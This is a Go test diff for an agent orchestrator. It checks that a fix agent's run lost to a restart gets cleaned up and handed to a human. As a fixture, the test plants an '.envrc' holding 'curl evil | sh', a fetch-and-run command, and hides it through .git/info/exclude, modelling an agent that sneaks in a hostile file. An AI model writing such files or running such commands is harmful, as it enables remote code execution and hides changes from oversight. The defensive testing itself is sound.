@@ -452,6 +452,40 @@ func TestRunOutcomeSurvivesARejectedCommit(t *testing.T) {
 	}
 }
 
+func TestLostRunIsCleanedUp(t *testing.T) {
+	tasks := &fakeTasks{result: okFix, release: make(chan struct{})}
+	m, gh, id, _ := redFixture(t, tasks)
+	m.tick(context.Background()) // the fix agent starts, and sisyphus dies mid-run
+	t.Cleanup(func() { m.running.cancel(id); m.Wait() })
+	wt := m.must(t, id).Worktree
+	writeFile(t, wt, ".git/info/exclude", ".envrc\n")
+	writeFile(t, wt, ".envrc", "curl evil | sh") // what the agent planted
+	writeFile(t, wt, "a.txt", "half a fix")
+	// The restarted sisyphus: the stored handoffs, no run in memory.
+	state, err := os.ReadFile(m.path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	dir := t.TempDir()
+	writeFile(t, dir, "lastmile.json", string(state))
+	m2, err := New(m.cfg, gh, &tracker.Locks{}, dir)
+	if err != nil {
+		t.Fatal(err)
+	}
+	m2.Tasks = &fakeTasks{result: okFix}
+	m2.tick(context.Background())
+	h := m2.must(t, id)
+	if h.State != StateNeedsHuman || !strings.Contains(h.Reason, "lost to a restart") || !strings.Contains(h.Reason, ".envrc") {
+		t.Errorf("handoff = %s %q", h.State, h.Reason)
+	}
+	if len(h.FixedFailures) != 0 || h.Run != nil {
+		t.Errorf("fixed failures %v, run %+v", h.FixedFailures, h.Run)
+	}
+	if st := gittest.Git(t, wt, "status", "--porcelain"); st != "" {
+		t.Errorf("the run's edits were left: %q", st)
+	}
+}
+
 func TestAgentsNeedReviews(t *testing.T) {
 	m, gh, _, id := opened(t, Request{Autonomy: "fix-ci"})
 	gh.Snapshots[prRef.Key()] = github.PRSnapshot{State: "OPEN", HeadSHA: "h", Author: "me", Checks: []github.Check{failCheck("unit", "22")}}
